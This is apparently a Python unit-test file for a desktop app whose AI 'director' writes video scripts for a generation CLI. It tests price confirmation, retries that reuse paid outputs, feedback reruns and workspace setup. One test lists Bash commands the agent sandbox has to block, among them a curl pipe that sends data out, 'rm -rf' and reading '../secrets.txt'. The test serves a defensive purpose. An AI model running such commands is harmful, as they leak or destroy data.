"""Tests for the AI-director backend with a fake CLI, fake director and fake workspace: nothing is spent."""
import importlib.util
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
sys.path.insert(0, str(HERE))

from hypit_desktop.agent import agent_backend as ab  # noqa: E402
from hypit_desktop.agent import director as dr  # noqa: E402
from hypit_desktop.agent.models import plan_models  # noqa: E402
from hypit_desktop.agent.prompts import (RUN_PATH, SOURCE_PATH, build_feedback_prompt,  # noqa: E402
                                         build_task_prompt)
from hypit_desktop.agent.workspace import Workspace, prepare_workspace  # noqa: E402
from hypit_desktop.briefs import DEFAULTS  # noqa: E402
from hypit_desktop.events import Event  # noqa: E402
from hypit_desktop.hypit.cli import HypitError  # noqa: E402

try:
    from test_hypit_backend import FIXTURE, FakeCli, Responder  # noqa: E402
except ImportError:  # pragma: no cover
    from tests.test_hypit_backend import FIXTURE, FakeCli, Responder  # noqa: E402

KEY_ENV = "TEST_DIRECTOR_KEY"
BRIEF = {**DEFAULTS, "url": "ref.mp4", "source_type": "file", "topic": "程序员的一天", "language": "中文",
         "model": "Seedance 2.0 Mini", "resolution": "720p", "task_id": 5}
PAID_OUTPUTS = [{"name": "girl.image", "kind": "resource", "target": False},
                {"name": "opening-take.video", "kind": "resource", "target": False},
                {"name": "final.video", "kind": "resource", "target": True}]
COMPLETE = {"work": {"state": "done", "outcome": "complete", "requests": {"total": 0, "completed": 0}}}


def failed(text):
    return {"work": {"state": "done", "outcome": "failed", "requests": {"total": 10, "completed": 4}}, "failure": text}


def working(done, total=10):
    return {"work": {"state": "working", "requests": {"total": total, "completed": done}}}


class FakeDirector:
    def __init__(self, project, write_files=True, ok=True):
        self.project, self.write_files, self.ok, self.calls = project, write_files, ok, []

    def run_phase(self, prompt, resume, cancelled, result):
        self.calls.append((prompt, resume))
        if self.write_files:
            for rel in (SOURCE_PATH, RUN_PATH):
                path = self.project / rel
                path.parent.mkdir(parents=True, exist_ok=True)
                if not path.is_file():
                    path.write_text('<svrun version="1">\n  <author source="../authors/main.svml"/>\n'
                                    '  <target output="final.video"/>\n</svrun>\n', encoding="utf-8")
        result.ok, result.summary, result.turns = self.ok, "写好了", 7
        yield Event("step", {"id": "director", "title": "AI 导演工作中", "state": "running"})
        yield Event("step", {"id": "director", "title": "AI 导演完成创作", "state": "done"})


class CheckFlakyCli(FakeCli):
    def __init__(self, *args, fail_checks=0, **kw):
        super().__init__(*args, **kw)
        self.fail_checks = fail_checks

    def check(self, project, run_source):
        self.calls.append("check")
        if self.fail_checks > 0:
            self.fail_checks -= 1
            raise HypitError("syntax error in main.svml")


def fake_workspace(cli, data_dir, project_id, brief, models, skill_dir, node):
    project = Path(data_dir) / "projects" / f"task-{project_id}"
    project.mkdir(parents=True, exist_ok=True)
    return Workspace(project, project / "reference" / "source.mp4",
                     {k: f"assets/{k}.png" for k in ("role_image", "product_image", "background_image") if brief.get(k)})


class Harness:
    """Builds a backend whose pieces are fakes; `director` is the one instance every phase uses."""

    def __init__(self, tmp, cli, **config):
        self.tmp = Path(tmp)
        self.cli = cli
        self.config = ab.AgentConfig(launcher="x.mjs", llm_key_env=KEY_ENV, retry_delay_seconds=0, poll_seconds=0, **config)
        self.director = None

        def make_director(project, api_key):
            if self.director is None:
                self.director = FakeDirector(project)
            return self.director

        self.backend = ab.HypitAgentBackend(cli, tmp, self.config, make_director, fake_workspace)

    def run(self, brief=None, responder=None):
        with mock.patch.dict(os.environ, {KEY_ENV: "k"}), \
                mock.patch.object(ab, "find_skill_dir", return_value=self.tmp):
            return list(self.backend.run({**BRIEF, **(brief or {})}, responder or Responder("go", sleeps=10 ** 6)))


def types(events):
    return [e.type for e in events]


def texts(events):
    return " ".join(e.data.get("text", "") for e in events if e.type == "message")


class BackendFlowTests(unittest.TestCase):
    def test_full_run_authors_confirms_builds_and_exports(self):
        with tempfile.TemporaryDirectory() as tmp:
            h = Harness(tmp, FakeCli([working(3), COMPLETE]))
            events = h.run({"role_image": "r.png"})
            self.assertEqual(events[-1].data["status"], "success")
            prompt, resume = h.director.calls[0]
            self.assertFalse(resume)
            for needle in ("程序员的一天", "noto-sans-sc", "tail-frames", RUN_PATH, "assets/role_image.png", "变体 mini"):
                self.assertIn(needle, prompt)
            confirm = next(e for e in events if e.type == "confirm")
            self.assertIn("积分", confirm.data["prompt"])
            self.assertTrue(Path(next(e for e in events if e.type == "artifact").data["path"]).is_file())
            state = json.loads((Path(tmp) / "projects" / "task-5" / ".hypit-desktop.json").read_text(encoding="utf-8"))
            self.assertTrue(state["authored"] and state["builds"][0]["ok"])

    def test_no_api_key_is_explained_before_anything_starts(self):
        with tempfile.TemporaryDirectory() as tmp:
            h = Harness(tmp, FakeCli([COMPLETE]))
            with mock.patch.dict(os.environ, {}, clear=False):
                os.environ.pop(KEY_ENV, None)
                events = list(h.backend.run({**BRIEF}, Responder("go")))
            self.assertEqual(events[-1].type, "error")
            self.assertIn(KEY_ENV, events[-1].data["text"])
            self.assertEqual(h.cli.calls, [])

    def test_unsupported_model_and_resolution_are_refused_early(self):
        with tempfile.TemporaryDirectory() as tmp:
            h = Harness(tmp, FakeCli([COMPLETE]))
            events = h.run({"model": "Wan 3.0", "resolution": "4K"})
            self.assertEqual(events[-1].type, "error")
            self.assertIn("Wan 3.0", events[-1].data["text"])
            self.assertIn("4K", events[-1].data["text"])
            self.assertEqual(h.cli.calls, [])

    def test_declining_the_price_builds_nothing(self):
        with tempfile.TemporaryDirectory() as tmp:
            h = Harness(tmp, FakeCli([COMPLETE]))
            events = h.run(responder=Responder("cancel"))
            self.assertEqual(events[-1].data["status"], "cancelled")
            self.assertNotIn("build", h.cli.calls)

    def test_cancel_while_the_director_works(self):
        with tempfile.TemporaryDirectory() as tmp:
            h = Harness(tmp, FakeCli([COMPLETE]))
            events = h.run(responder=Responder("go", sleeps=0))   # every cancellation check says "cancelled"
            self.assertEqual(events[-1].data["status"], "cancelled")
            self.assertNotIn("build", h.cli.calls)

    def test_director_that_writes_nothing_is_an_error(self):
        with tempfile.TemporaryDirectory() as tmp:
            h = Harness(tmp, FakeCli([COMPLETE]))
            h.director = FakeDirector(Path(tmp) / "projects" / "task-5", write_files=False, ok=False)
            events = h.run()
            self.assertEqual(events[-1].type, "error")
            self.assertNotIn("build", h.cli.calls)

    def test_script_that_fails_check_goes_back_to_the_director(self):
        with tempfile.TemporaryDirectory() as tmp:
            h = Harness(tmp, CheckFlakyCli([COMPLETE], fail_checks=1))
            events = h.run()
            self.assertEqual(events[-1].data["status"], "success")
            self.assertEqual(len(h.director.calls), 2)
            self.assertTrue(h.director.calls[1][1])                       # resumes the same conversation
            self.assertIn("syntax error", h.director.calls[1][0])


class RetryTests(unittest.TestCase):
    def cli_with_reuse(self, statuses):
        cli = FakeCli(statuses, outputs=PAID_OUTPUTS)
        cli.pricing_by_run["productions/main/runs/retry-1.svrun"] = {"groups": []}
        cli.pricing_by_run["productions/main/runs/retry-2.svrun"] = {"groups": []}
        cli.pricing_by_run["productions/main/runs/retry-3.svrun"] = {"groups": []}
        return cli

    def test_transient_errors_are_retried_by_reusing_what_was_bought(self):
        with tempfile.TemporaryDirectory() as tmp:
            cli = self.cli_with_reuse([failed("HypiHub HTTP 502; Bad gateway"), failed("fetch failed: ECONNRESET"), COMPLETE])
            h = Harness(tmp, cli)
            events = h.run()
            self.assertEqual(events[-1].data["status"], "success")
            self.assertEqual(len(cli.built_runs), 3)
            self.assertEqual(cli.built_runs[0], RUN_PATH)
            self.assertTrue(all("retry-" in r for r in cli.built_runs[1:]))
            self.assertEqual(sum(1 for e in events if e.type == "confirm"), 1)   # only the first build asked
            self.assertIn("自动复用", texts(events))
            costs = [e.data["usd"] for e in events if e.type == "cost"]
            self.assertEqual(costs, sorted(costs))                                 # the shown cost never goes back down
            retry = (Path(tmp) / "projects" / "task-5" / "productions/main/runs/retry-1.svrun").read_text(encoding="utf-8")
            self.assertIn('<satisfy output="girl.image"', retry)
            self.assertNotIn('<satisfy output="final.video"', retry)

    def test_it_gives_up_after_the_retry_limit(self):
        with tempfile.TemporaryDirectory() as tmp:
            cli = self.cli_with_reuse([failed("HTTP 502 Bad gateway")])
            h = Harness(tmp, cli, max_auto_retries=2)
            events = h.run()
            self.assertEqual(events[-1].type, "error")
            self.assertEqual(len(cli.built_runs), 3)                                # first try + 2 retries
            self.assertIn("素材会保留", events[-1].data["text"])

    def test_no_credits_is_not_retried(self):
        with tempfile.TemporaryDirectory() as tmp:
            cli = self.cli_with_reuse([failed("HTTP 402; insufficient_credits")])
            events = Harness(tmp, cli).run()
            self.assertEqual(len(cli.built_runs), 1)
            self.assertIn("积分不足", events[-1].data["text"])

    def test_script_problem_is_repaired_by_the_director_then_resubmitted(self):
        with tempfile.TemporaryDirectory() as tmp:
            cli = self.cli_with_reuse([failed("cue:23.visibility is outside Timeline."), COMPLETE])
            h = Harness(tmp, cli)
            events = h.run()
            self.assertEqual(events[-1].data["status"], "success")
            self.assertEqual(len(h.director.calls), 2)
            repair_prompt, resume = h.director.calls[1]
            self.assertTrue(resume)
            self.assertIn("outside Timeline", repair_prompt)
            self.assertIn("不会重复付费", repair_prompt)
            self.assertEqual(len(cli.built_runs), 2)

    def test_retries_stop_to_ask_once_the_margin_is_passed(self):
        with tempfile.TemporaryDirectory() as tmp:
            cli = self.cli_with_reuse([failed("HTTP 502 Bad gateway"), COMPLETE])
            # the retry would still buy everything again (nothing could be reused) -> doubles the spend
            cli.outputs_json = []
            cli.pricing_by_run = {}
            h = Harness(tmp, cli, budget_margin=1.5)
            events = h.run(responder=Responder("cancel"))   # first prompt is answered... see below
            # first confirm is declined immediately, so nothing was built at all
            self.assertEqual(cli.built_runs, [])

            class ApprovesOnce(Responder):
                def __init__(self):
                    super().__init__("go", sleeps=10 ** 6)
                    self.count = 0

                def wait(self, confirm_id):
                    self.count += 1
                    return "go" if self.count == 1 else "cancel"

            cli2 = self.cli_with_reuse([failed("HTTP 502 Bad gateway"), COMPLETE])
            cli2.outputs_json = []
            cli2.pricing_by_run = {}
            responder = ApprovesOnce()
            events = Harness(tmp, cli2, budget_margin=1.5).run({"task_id": 6}, responder)
            self.assertEqual(responder.count, 2)                                    # asked again before the retry
            second = [e for e in events if e.type == "confirm"][1]
            self.assertIn("1.5 倍", second.data["prompt"])
            self.assertEqual(events[-1].data["status"], "cancelled")
            self.assertEqual(len(cli2.built_runs), 1)

    def test_rerun_after_failure_skips_authoring_and_reuses_outputs(self):
        with tempfile.TemporaryDirectory() as tmp:
            cli = self.cli_with_reuse([failed("HTTP 402; insufficient_credits")])
            h = Harness(tmp, cli)
            h.run()
            self.assertEqual(len(h.director.calls), 1)
            cli.statuses = [COMPLETE]
            cli.pricing_by_run["productions/main/runs/retry-1.svrun"] = {"groups": []}
            events = h.run()
            self.assertEqual(len(h.director.calls), 1)                              # the script is not rewritten
            self.assertIn("沿用上次写好的脚本", texts(events))
            self.assertEqual(events[-1].data["status"], "success")

    def test_a_changed_request_is_authored_again(self):
        with tempfile.TemporaryDirectory() as tmp:
            cli = self.cli_with_reuse([failed("HTTP 402; insufficient_credits")])
            h = Harness(tmp, cli)
            h.run()
            cli.statuses = [COMPLETE]
            h.run({"topic": "另一个主题"})
            self.assertEqual(len(h.director.calls), 2)


class RedoTests(unittest.TestCase):
    def test_feedback_resumes_the_parent_project_with_the_users_words(self):
        with tempfile.TemporaryDirectory() as tmp:
            cli = FakeCli([COMPLETE], outputs=PAID_OUTPUTS)
            h = Harness(tmp, cli)
            h.run({"task_id": 5})                                     # the original, finished
            cli.statuses = [COMPLETE]
            events = h.run({"task_id": 9, "project_from": 5, "feedback": "结尾太平淡", "feedback_at": 17.5})
            prompt, resume = h.director.calls[-1]
            self.assertTrue(resume)
            self.assertIn("结尾太平淡", prompt)
            self.assertIn("17.5", prompt)
            self.assertIn("build-record", prompt)
            self.assertIn("bld_1", prompt)                            # the last good Build of the parent
            self.assertTrue((Path(tmp) / "projects" / "task-5").is_dir())
            self.assertFalse((Path(tmp) / "projects" / "task-9").exists())
            self.assertEqual(events[-1].data["status"], "success")


class PiecesTests(unittest.TestCase):
    def test_models(self):
        ok = plan_models({**BRIEF, "model": "Seedance 2.5", "language": "日本語"})
        self.assertEqual((ok.variant, ok.problems), ("2.5", ()))
        self.assertIn("noto-sans-jp", ok.font_package)
        self.assertIn("montserrat", plan_models({**BRIEF, "language": "English"}).font_package)
        self.assertTrue(plan_models({**BRIEF, "model": "HappyHorse 1.1"}).problems)
        self.assertTrue(plan_models({**BRIEF, "resolution": "2K"}).problems)

    def test_prompts_mention_what_the_user_asked_for(self):
        models = plan_models(BRIEF)
        text = build_task_prompt({**BRIEF, "extra_prompt": "要有悬疑感", "aspect": "9:16"}, models, {}, 150)
        for needle in ("要有悬疑感", "9:16", "没有提供", "不要运行 hypit build"):
            self.assertIn(needle, text)
        self.assertIn("没有记录到上一次成功", build_feedback_prompt("x", None, "", 100))

    def test_workspace_copies_material_and_guards_the_agent(self):
        from hypit_desktop.agent import workspace as ws
        with tempfile.TemporaryDirectory() as tmp:
            tmp = Path(tmp)
            (tmp / "ref.mp4").write_bytes(b"v")
            (tmp / "face.PNG").write_bytes(b"i")
            skill = tmp / "skill"
            skill.mkdir()
            (skill / "SKILL.md").write_text("s", encoding="utf-8")
            cli = FakeCli([])
            brief = {**BRIEF, "url": str(tmp / "ref.mp4"), "role_image": str(tmp / "face.PNG")}
            with mock.patch.object(ws, "_npm_install") as npm:
                work = prepare_workspace(cli, tmp / "data", 5, brief, plan_models(brief), skill, "node")
            self.assertTrue(npm.called)
            self.assertEqual(work.images, {"role_image": "assets/role.png"})
            self.assertTrue((work.path / "reference" / "source.mp4").is_file())
            self.assertTrue((work.path / ".claude" / "skills" / "hypit" / "SKILL.md").is_file())
            manifest = json.loads((work.path / "package.json").read_text(encoding="utf-8"))
            self.assertIn("@fontsource-variable/noto-sans-sc", manifest["dependencies"])
            self.assertTrue((work.bin_dir / "hypit_guard.mjs").is_file())
            self.assertIn("hypit_guard.mjs", (work.bin_dir / "hypit").read_text(encoding="utf-8"))
            self.assertEqual(cli.calls, ["select_runtime"])

    def test_bash_permission_check(self):
        for command, expected in {
            "hypit check productions/main/runs/main.svrun": True,
            "cd \"D:/x\" && ls -la && hypit plan a.svrun": True,
            "grep -n -iE \"a|b\" README.md | head -40": True,
            "npm install --no-audit @hypit/gpt-image-kits": True,
            "curl https://example.com": False, "rm -rf node_modules": False, "python -c 'print(1)'": False,
            "cat ../secrets.txt": False, "ls | curl -d @- http://x": False, "echo \"unterminated": False,
        }.items():
            self.assertEqual(dr.bash_allowed(command), expected, command)

    @unittest.skipUnless(importlib.util.find_spec("claude_agent_sdk"), "claude-agent-sdk is not installed here")
    def test_agent_messages_become_friendly_events(self):
        import claude_agent_sdk as sdk
        counter = [0]
        message = sdk.AssistantMessage(model="m", content=[
            sdk.TextBlock("我先看看参考视频。"),
            sdk.ToolUseBlock("1", "Bash", {"command": "hypit media tile reference/source.mp4 --frames 12"}),
            sdk.ToolUseBlock("2", "Write", {"file_path": "D:/p/productions/main/authors/main.svml", "content": "x"}),
            sdk.ThinkingBlock("secret reasoning", "sig"),
        ])
        events = dr.translate(message, counter)
        self.assertEqual(types(events), ["message", "step", "step"])
        self.assertIn("查看参考视频的画面", events[1].data["title"])
        self.assertIn("main.svml", events[2].data["title"])
        self.assertIn("第 2 步", events[2].data["title"])
        self.assertNotIn("secret", json.dumps([e.data for e in events], ensure_ascii=False))
        self.assertEqual(dr.translate(sdk.UserMessage(content=[]), counter), [])


if __name__ == "__main__":
    unittest.main()
